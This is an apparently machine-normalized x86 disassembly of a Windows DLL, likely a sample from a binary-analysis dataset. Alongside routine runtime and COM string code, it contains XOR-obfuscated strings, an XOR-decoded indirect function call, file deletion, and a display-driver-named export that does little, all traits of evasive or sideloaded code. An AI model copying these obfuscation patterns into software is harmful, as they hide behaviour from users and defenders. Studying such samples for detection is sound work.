push eax
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x10d
call sub_100050e0
mov edx [ ebx + 0x2c ]
lea ecx [ ebp - 0x1d4 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0x1d4 ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1d4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x12c
jmp r-xdata
lea edx [ ebp - 0x15c ]
mov eax 0x103
call sub_100050e0
mov esi [ ebp - 0x1d4 ]
mov eax edx
push eax
lea ecx [ ebp - 0x1c4 ]
push ecx
push edi
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d4 ] eax
mov edx [ ebp - 0x1d4 ]
mov edi [ SysFreeString@IAT ]
push edx
call edi
mov ecx [ ebx + 0x28 ]
lea eax [ ebp - 0x1dc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1dc ] 0x0
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0x1dc ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xeb
call sub_100050e0
lea edx [ ebp - 0x148 ]
mov eax 0x86
call sub_100050e0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10022870
mov edx [ ebp - 0x1dc ]
push edx
call edi
mov ecx [ ebx + 0x24 ]
lea eax [ ebp - 0x1d8 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d8 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1dc ] eax
lea edx [ ebp - 0x18c ]
mov eax 0xd5
call sub_100050e0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d8 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d8 ] eax
mov edx [ ebp - 0x1d8 ]
push edx
call edi
cmp [ ebx + 0x38 ] 0x1
jne r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0xfc
call sub_100050e0
mov edx [ ebp - 0x1e8 ]
mov ecx [ ebp - 0x1c8 ]
call sub_10049320
test eax eax
je r-xdata
lea eax [ ebp - 0x1e4 ]
push eax
push 0x0
push 0x80000000
push 0x1
mov [ ebp - 0x1e4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1e4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x1f4 ]
push edx
mov edx [ ebp - 0x1e8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x1f4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x66
call sub_100050e0
lea edx [ ebp - 0xf8 ]
mov eax 0x63
call sub_100050e0
mov eax [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0x1c4 ]
push edx
push eax
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e4 ] eax
lea edx [ ebp - 0x74 ]
mov eax 0x9e
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x1f4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1e4 ]
push ecx
call edi
mov eax [ ebx + 0x44 ]
mov ecx [ ebx + 0x40 ]
lea edx [ ebp - 0x1e0 ]
push edx
push 0x0
push 0x80000000
push eax
push ecx
mov [ ebp - 0x1e0 ] 0x0
call [ VarBstrFromUI8@IAT ]
cmp [ ebp - 0x1e0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x1f
call sub_100050e0
lea edx [ ebp - 0x10c ]
mov eax 0x8a
call sub_100050e0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1e0 ] eax
mov edx [ ebp - 0x1e0 ]
push edx
call edi
mov ecx [ ebx + 0x48 ]
lea eax [ ebp - 0x1d0 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1d0 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1d0 ] 0x0
jne r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x90
call sub_100050e0
lea edx [ ebp - 0x9c ]
mov eax 0x91
call sub_100050e0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1d0 ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1d0 ] eax
mov edx [ ebp - 0x1d0 ]
push edx
call edi
mov ecx [ ebx + 0x4c ]
lea eax [ ebp - 0x1cc ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x1cc ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x1cc ] 0x0
jne r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x102
call sub_100050e0
lea edx [ ebp - 0x174 ]
mov eax 0xe9
call sub_100050e0
mov ecx [ ebp - 0x1c8 ]
mov esi [ ebp - 0x1cc ]
push edx
lea eax [ ebp - 0x1c4 ]
push eax
push ecx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x1cc ] eax
mov edx [ ebp - 0x1cc ]
push edx
call edi
lea edx [ ebp - 0x74 ]
mov eax 0x9b
call sub_100050e0
sub_1001fae0
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push edi
xor edi edi
mov [ ebp - 0x80 ] edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffb
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x12 ] ax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0x12e
mov [ ebp - 0x78 ] edi
call sub_100050e0
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x120 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x6f
mov [ ebp - 0x78 ] edi
call sub_100050e0
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x124 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x74 ]
mov eax 0x120
call sub_100050e0
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x7c ] edi
mov eax [ ebp - 0x7c ]
cmp eax edi
je r-xdata
sub_1001fc0f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10043f7b
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_1001fc41
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1001fccb
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100075b8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
ADL2_DFP_PixelFormat_Set
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push 0x0
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
call [ GetLastError@IAT ]
lea eax [ eax + eax * 2 - 0xf ]
retn
sub_1001fda5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
push 0x16
pop eax
pop ebp
retn
sub_1001fde0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call [ GetModuleHandleW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
xor ecx ebp
neg eax
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001fe55
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1004d14b
push r--data
push r--data
call sub_10042db7
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_10057cd0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_100147ca
call sub_100662c2
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_10057cd0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1001fef0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0xc ] eax
call sub_100796a0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0xc ] 0x0
sub_1001ff50
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push ebx
call edx
cmp [ edi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov ebx [ DeleteFileW@IAT ]
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
cmp [ edi + 0x84 ] 0x8
lea eax [ edi + 0x70 ]
jb r-xdata
push esi
mov esi [ edi + 0xb4 ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov cl 0x38
xor [ ebp - 0x4 ] cl
xor [ ebp - 0x3 ] cl
xor [ ebp - 0x2 ] cl
xor [ ebp - 0x1 ] cl
push eax
call [ ebp - 0x4 ]
mov [ edi + 0xb0 ] 0x0
mov ebx [ DeleteFileW@IAT ]
push eax
call ebx
jmp r-xdata
mov eax [ eax ]
mov eax [ edi + 0xb4 ]
mov ecx [ edi + 0xb8 ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
add edi 0x94
cmp [ edi + 0x14 ] 0x8
pop esi
jb r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10047480
mov ebx [ edi + 0xb8 ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov esi eax
cmp eax ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
call ebx
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov edi [ edi ]
mov ebx [ DeleteFileW@IAT ]
mov [ edi + 0xb8 ] eax
lea ecx [ ecx ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10020080
push esi
mov esi [ eax ]
push edi
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ lstrcmpW@IAT ]
mov edi edi
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn
mov ecx [ ebx + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call edi
test eax eax
je r-xdata
sub_10020110
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov ecx edi
mov esi ebx
call sub_100324e0
test eax eax
jne r-xdata
mov edx [ edi + 0x108 ]
mov eax [ edi + 0x100 ]
lea eax [ edx + eax + 0x7 ]
lea ecx [ eax + eax * 2 ]
add ecx [ edi + 0x50 ]
mov eax esi
sub eax ebx
cmp eax ecx
jae r-xdata
lea ebx [ ebx ]
lea ebx [ esi - 0x1 ]
lea edx [ ebx - 0x5 ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
cmp eax edx
jb r-xdata
mov eax ecx
mov ecx [ ebp + 0x8 ]
add esi ebx
push esi
push ecx
mov ecx edi
call sub_100324e0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea esi [ ecx + ebx ]
shr esi 0x1
push esi
push eax
mov ecx edi
call sub_100324e0
test eax eax
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] esi
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea ecx [ ebx - 0x5 ]
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_100201c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081c30
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x71c71c7
jbe r-xdata
mov ecx edi
call sub_10003bb0
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
call sub_100027f0
add esp 0x10
mov [ esi + 0x4 ] eax
push r--data
call sub_1002c5ed
sub_10020290
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
sub_100202ee
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10041a88
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1005df26
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10020380
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_10020399
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001d859
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_100203c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10045ea5
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_1000977c
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_10022b5a
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_1000977c
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_100317fa
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10045ea5
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_100492ed
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_10022b5a
pop ecx
inc esi
push esi
push eax
call sub_1000977c
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_10022b5a
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10045ea5
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
sub_10020580
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax edx
sub eax [ ecx + 0x34 ]
push ebx
mov ebx [ ecx + 0xa4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0xa0 ]
add eax edx
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
jmp r-xdata
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
add esi edx
lea edx [ eax + 0x8 ]
sub ebx ecx
lea edi [ ecx - 0x8 ]
add eax ecx
xor ecx ecx
shr edi 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ebx
je r-xdata
test ebx ebx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ edx + ecx * 2 ]
and edx 0xfff
add [ edx + esi ] ebx
mov edx [ ebp - 0x8 ]
cmp [ edx + ecx * 2 ] 0x0
je r-xdata
mov ebx [ ebp - 0xc ]
sub_10020610
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp edi [ ebp + 0x8 ]
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
mov ebx edi
push esi
lea esi [ eax + 0x1c ]
sub ebx eax
push 0xffffffff
push 0x0
push edi
mov ecx eax
call sub_10019180
mov eax [ ebx + esi ]
add [ ebp - 0x4 ] 0x24
mov [ esi ] eax
mov ecx [ ebx + esi + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] ecx
add edi 0x24
add esi 0x24
cmp edi [ ebp + 0x8 ]
jne r-xdata
pop esi
pop ebx
sub_10020659
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_1004fd6f
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_100051e8
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_1005ad98
add esp 0x24
leave
retn
sub_100206e1
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100077c6
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_1007c2c0
sub_10020734
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005d04d
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_100207e0
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
push edi
xor edi edi
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] edi
call sub_1005b4f0
mov [ ebp - 0x50 ] eax
cmp eax edi
je r-xdata
push 0x4
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
lea eax [ edi + 0x1c ]
call sub_100050e0
mov esi [ ebp - 0x4c ]
cmp esi edi
je r-xdata
inc [ edi ]
lea eax [ ebp - 0x5c ]
cmp ebx eax
je r-xdata
mov [ eax ] edi
mov edi eax
mov esi [ ebp - 0x54 ]
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x50 ]
pop edi
mov [ esi ] 0x0
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
call sub_10021ec0
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov eax [ ebx + 0x4 ]
dec [ eax ]
jne r-xdata
test esi esi
je r-xdata
mov esi [ ebp - 0x4c ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
inc [ edi ]
jmp r-xdata
mov esi [ ebx ]
test esi esi
je r-xdata
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
call sub_10021ec0
dec [ edi ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
call sub_10021ec0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100208c5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
